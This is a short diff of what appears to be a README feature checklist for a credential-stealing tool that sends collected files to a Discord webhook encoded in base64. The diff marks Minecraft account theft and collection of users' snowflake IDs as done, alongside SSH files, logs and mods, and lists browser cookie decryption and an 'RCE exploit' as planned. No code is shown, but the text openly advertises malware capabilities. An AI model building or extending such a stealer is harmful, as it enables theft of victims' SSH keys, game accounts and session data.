@@ -18,7 +18,8 @@ Sending the files through discord webhook that encrypted with base64
 - [x] Minecraft Mods
 - [x] Ssh files
 - [x] Log file
-- [ ] Minecraft accounts
+- [x] Minecraft accounts
+- [x] User's with snowflake id's
 - [ ] Browser cookies with decrypt
 - [x] RAR the sent files and save it to a server
 - [ ] RCE exploit (Administrator only)
